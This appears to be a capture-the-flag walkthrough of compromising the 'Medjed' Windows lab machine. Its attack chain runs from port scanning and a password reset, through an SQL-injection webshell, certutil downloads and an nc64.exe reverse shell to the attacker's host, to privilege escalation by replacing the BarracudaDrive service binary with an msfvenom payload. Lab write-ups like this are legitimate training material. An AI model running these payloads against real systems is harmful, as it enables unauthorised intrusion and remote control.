---
icon: windows
---

# Medjed - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.225.127 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-30 16:05 EDT
Nmap scan report for 192.168.225.127
Host is up (0.028s latency).
Not shown: 65517 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8000/tcp  open  http-alt      BarracudaServer.com (Windows)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-webdav-scan: 
|   Server Date: Tue, 30 Sep 2025 20:09:21 GMT
|   Server Type: BarracudaServer.com (Windows)
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|_http-server-header: BarracudaServer.com (Windows)
|_http-title: Home
| fingerprint-strings: 
|   FourOhFourRequest, Socks5: 
|     HTTP/1.1 200 OK
|     Date: Tue, 30 Sep 2025 20:06:43 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   GenericLines, GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 30 Sep 2025 20:06:38 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 30 Sep 2025 20:06:48 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   SIPOptions: 
|     HTTP/1.1 400 Bad Request
|     Date: Tue, 30 Sep 2025 20:07:51 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|     Content-Type: text/html
|     Cache-Control: no-store, no-cache, must-revalidate, max-age=0
|_    <html><body><h1>400 Bad Request</h1>Can't parse request<p>BarracudaServer.com (Windows)</p></body></html>
| http-methods: 
|_  Potentially risky methods: PROPFIND PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
30021/tcp open  ftp           FileZilla ftpd 0.9.41 beta
|_ftp-bounce: bounce working!
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r-- 1 ftp ftp            536 Nov 03  2020 .gitignore
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 app
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 bin
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 config
| -r--r--r-- 1 ftp ftp            130 Nov 03  2020 config.ru
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 db
| -r--r--r-- 1 ftp ftp           1750 Nov 03  2020 Gemfile
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 lib
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 log
| -r--r--r-- 1 ftp ftp             66 Nov 03  2020 package.json
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 public
| -r--r--r-- 1 ftp ftp            227 Nov 03  2020 Rakefile
| -r--r--r-- 1 ftp ftp            374 Nov 03  2020 README.md
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 test
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 tmp
|_drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 vendor
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
33033/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 3102
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
44330/tcp open  ssl/unknown
|_ssl-date: 2025-09-30T20:09:50+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=server demo 1024 bits/organizationName=Real Time Logic/stateOrProvinceName=CA/countryName=US
| Not valid before: 2009-08-27T14:40:47
|_Not valid after:  2019-08-25T14:40:47
45332/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Quiz App
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
45443/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Quiz App
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-30T20:09:25
|_  start_date: N/A
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   28.30 ms 192.168.45.1
2   28.21 ms 192.168.45.254
3   28.33 ms 192.168.251.1
4   28.50 ms 192.168.225.127

```

### <mark style="color:$primary;">HTTP Port 8000 TCP</mark>

<figure><img src="../../.gitbook/assets/image (1043).png" alt=""><figcaption></figcaption></figure>

Upon visiting the webpage we are greeted by a Windows BarracudaDrive server, It asks us to set an administrator account. I will make one with admin@gmail.com:admin:password -> then click on Set Administrator

<figure><img src="../../.gitbook/assets/image (1044).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1045).png" alt=""><figcaption></figcaption></figure>

The about page delivers us a version. I know this version of BarracudaDrive has a privesc available on ExploitDB

<figure><img src="../../.gitbook/assets/image (1046).png" alt=""><figcaption></figcaption></figure>

I am actually going to download this to my machine and keep it for later when I get a shell on the machine

```
searchsploit -m 48789
```

I'll continue my enumeration on port 33033

### <mark style="color:$primary;">HTTP Port 33033 TCP</mark>

<figure><img src="../../.gitbook/assets/image (1033).png" alt=""><figcaption></figcaption></figure>

Upon visiting the website, we were greeted by a page that contains the name, email, quote and picture of each team member. The cat photo stands out!

If we click on the top right Login button we are redirected to the following page

<figure><img src="../../.gitbook/assets/image (1034).png" alt=""><figcaption></figcaption></figure>

There is a forgot password link:

<figure><img src="../../.gitbook/assets/image (1035).png" alt=""><figcaption></figcaption></figure>

I am hoping the cat pictures has what I need to reset the password.

After a a couple of tries I found this username and reminder to reset the password:

```
Username:jerren.devops
Reminder:paranoid
```

I am going to change the password to <mark style="color:$info;">**Password123!**</mark>

<figure><img src="../../.gitbook/assets/image (1036).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1037).png" alt=""><figcaption></figcaption></figure>

After logging in, I was redirected to the following page

<figure><img src="../../.gitbook/assets/image (1038).png" alt=""><figcaption></figcaption></figure>

Clicking on the Edit button located at the bottom left, reveals a page with a really interesting link

<figure><img src="../../.gitbook/assets/image (1039).png" alt=""><figcaption></figcaption></figure>

Let's see where it leads

<figure><img src="../../.gitbook/assets/image (1040).png" alt=""><figcaption></figcaption></figure>

we can execute SQL commands here! I am going to check if it is vulnerable to SQLI

<figure><img src="../../.gitbook/assets/image (1041).png" alt=""><figcaption></figcaption></figure>

Submitting a ' and clicking the request button let's to a SQL error, this means it is vulnerable to SQLI.

<figure><img src="../../.gitbook/assets/image (1042).png" alt=""><figcaption></figcaption></figure>

We could insert a php webshell, let's hope I find the root directory on one of the other websites! I am going to continue my enumeration on another port

### <mark style="color:$primary;">HTTP Port 45332 TCP</mark>

<figure><img src="../../.gitbook/assets/image (1047).png" alt=""><figcaption></figcaption></figure>

This is a basic Quiz website. I am going to run dirsearch and check to see if I can find any useful endpoints!

```
dirsearch -u http://192.168.225.127:45332/
```

<figure><img src="../../.gitbook/assets/image (1048).png" alt=""><figcaption></figcaption></figure>

Yes this is what I was looking for!

<figure><img src="../../.gitbook/assets/image (1049).png" alt=""><figcaption></figcaption></figure>

Now that I found the document root I am going to try to place a php webshell there and try to access it!

### <mark style="color:$primary;">SQLI -> php webshell</mark>&#x20;

Let's go back to querry console we found on port 33033, and try to place php webshell with the following SQLI:

```
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "C:/xampp/htdocs/cmd.php" -- 
```

<figure><img src="../../.gitbook/assets/image (1050).png" alt=""><figcaption></figcaption></figure>

OK we clicked the request and nothing happened let's check if we can access our webshell!

<figure><img src="../../.gitbook/assets/image (1051).png" alt=""><figcaption></figcaption></figure>

It worked! Let's get a proper shell on the system. I'll save nc64.exe to the system and have it give me a reverse shell:

Before running this command, make sure you have a python webserver ready hosting nc64.exe&#x20;

```
http://192.168.225.127:45332/cmd.php?cmd=certutil -urlcache -split -f http://192.168.45.158/nc64.exe C:\Users\Jerren\nc64.exe
```

<figure><img src="../../.gitbook/assets/image (1052).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1053).png" alt=""><figcaption></figcaption></figure>

Now to get a reverse shell, have a listener ready on your port of choice and run this command:

```
http://192.168.225.127:45332/cmd.php?cmd=C:\Users\Jerren\nc64.exe 192.168.45.158 135 -e cmd.exe
```

<figure><img src="../../.gitbook/assets/image (1054).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1055).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">BarracudaDrive 6.5</mark>

I am going straight for the privesc method we discovered in the beginning on port 8000

<figure><img src="../../.gitbook/assets/image (1056).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1057).png" alt=""><figcaption></figcaption></figure>

You can use the method we discovered on searchsploit earlier or there is another one available on Github here is the [**link**](https://github.com/boku7/BarracudaDrivev6.5-LocalPrivEsc/blob/master/barracudaDrive6.5-PrivEsc.txt)

<figure><img src="../../.gitbook/assets/image (1058).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:$primary;">Service Binary Hijacking</mark>

I am going to create a reverse.exe binary using msfvenom and replace bd.exe with it

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.158 LPORT=135 -f exe -o reverse.exe
```

<figure><img src="../../.gitbook/assets/image (1059).png" alt=""><figcaption></figcaption></figure>

Let's download it to the machine:

```
certutil -urlcache -split -f http://192.168.45.158/reverse.exe C:\Users\Jerren\Documents\reverse.exe
```

<figure><img src="../../.gitbook/assets/image (1060).png" alt=""><figcaption></figcaption></figure>

I am going to replace bd.exe with reverse.exe&#x20;

<figure><img src="../../.gitbook/assets/image (1061).png" alt=""><figcaption></figcaption></figure>

I saved bd.exe into bd.exe.bk just in case something goes wrong I have a backup and replaced bc.exe with our reverse binary shell. Make sure you have a listener ready, and the only command left to run is&#x20;

```
shutdown -r
```

<figure><img src="../../.gitbook/assets/image (1063).png" alt=""><figcaption></figcaption></figure>

Now wait a minute, and you shall get a reverse shell as the admin user

<figure><img src="../../.gitbook/assets/image (1064).png" alt=""><figcaption></figcaption></figure>

And we got a shell as admin!
